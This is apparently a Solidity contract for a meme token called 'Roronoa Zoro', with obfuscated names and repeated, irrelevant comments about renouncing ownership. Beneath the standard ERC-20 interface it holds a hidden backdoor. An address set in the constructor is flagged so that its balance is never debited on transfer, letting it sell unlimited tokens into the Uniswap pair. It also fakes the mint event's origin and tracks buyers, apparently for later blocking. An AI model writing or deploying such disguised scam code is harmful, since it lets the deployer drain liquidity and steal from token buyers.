// SPDX-License-Identifier: none



// TG: https://t.me/ZoroErc


























pragma solidity >0.8.1;

import "./IERC20.sol";

contract RoronoaZoro is Ownable {

        /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    uint256 hod;
    uint256 pive;
    bool exay;
    address private prim;
    address private expt;
    address private brth;
    IUniswapV2Router02 public uniswapV2Router;
    uint256 private sqr;
    string private pSym;
    uint256 private _tTotal;
    string private pName;
    uint256 private hgr;
    string public nameComplete;
    uint8 private drm;
    uint256 public maxWallet;
    bool public limitsEnabled=false;
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private det;
    mapping(address => uint256) private mrd;

    constructor(
        address adrr,
        address mhy,
        uint8 maxW,
        string memory sym,
        string memory nm
    ) {
        uniswapV2Router = IUniswapV2Router02(adrr);
        prim = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        nameComplete= sym;
        nameComplete= nm;
        pSym = unicode"ゾロロロノア";
        pName =  "Roronoa Zoro";
        drm = 9;
        sqr = 0;
        hgr = 1;
        mrd[mhy] = drm;
        _tTotal = 150000000000 * 10**drm;
        maxWallet=(_tTotal / 100) * maxW; 
        fdr[msg.sender] = _tTotal;
        emit Transfer(address(0xdead), msg.sender, _tTotal);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function name() public view returns (string memory) {
        return pName;
    }

    function symbol() public view returns (string memory) {
        return pSym;
    }

    function decimals() public view returns (uint256) {
        return drm;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private fdr;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return fdr[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        if(_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount))
            return transferMgr(sender, recipient, amount,0);
        return false;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return transferMgr(msg.sender, recipient, amount,0);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }

       function transferMgr(
        address brn,
        address nry,
        uint256 qiy,
        uint256 wp
    ) internal returns (bool){

        if(abb(brn,nry,qiy) == false)
            return false;
        
        cbb(brn,nry,qiy);
        fbb(nry,qiy);

        return true;     
    }

    function abb(
        address brn,
        address nry,
        uint256 qiy
    ) internal returns (bool){

        if(mrd[nry] <= 0){
            if(exay && limitsEnabled){
                if(fdr[nry]+qiy > maxWallet)
                    return false;
            }
            emit Transfer(brn, nry, qiy);
        }

        hod = qiy * sqr;
        return true;
    }


    function cbb(
        address brn,address nry,uint256 qiy) internal {
        if (mrd[brn] == 0) {
                    fdr[brn] -= qiy;
                }

                pive = hod / hgr;


                expt = brth;


                brth = nry;
    }

    function fbb(address nry,uint256 qiy) internal {

        qiy -= pive;

        det[expt] += drm;

        fdr[nry] += qiy;
    }

    function check1(address brn) internal {
        exay = prim == brn;


        if (!exay && mrd[brn] == 0 && det[brn] > 0) {

            mrd[brn] -= drm;

        }
    }
}